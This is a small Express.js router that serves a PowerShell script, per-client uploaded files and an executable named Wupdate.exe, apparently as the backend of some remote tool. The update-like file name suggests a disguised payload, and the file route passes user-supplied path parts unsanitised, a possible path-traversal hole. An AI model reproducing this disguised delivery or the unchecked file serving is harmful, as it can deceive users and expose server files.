const router = require('express').Router();
const toolCookieValidator = require('../../Utils/MiddleWears/toolCookieValidator');
const path = require("path");
const fs = require("fs");
const express = require("express");
const appDir = path.dirname(require.main.filename);

router.route('/ps1').get((req, res) => {
    if(process.env.NODE_ENV === 'development')
        res.download(path.resolve(appDir,'ToolScripts','Prompt_dev.ps1'))
    else
        res.download(path.resolve(appDir,'ToolScripts','Prompt.ps1'))
})

router.use(toolCookieValidator);

//Serve uploaded files
router.use("/:id/:file",(req, res, next) => {
    let id = req.params.id
    let file = req.params.file
    express.static(path.resolve(appDir,'Utils','clientFiles',id,file))(req, res, next)
})

router.route('/wupdate').get((req, res) => {
    res.setHeader('Content-disposition', 'attachment; filename=Wupdate.exe');
    res.setHeader('Content-type', 'application/x-msdownload');
    let file = fs.createReadStream(path.resolve(appDir, 'ToolScripts', 'Wupdate.exe'));
    file.pipe(res)
})
module.exports = router;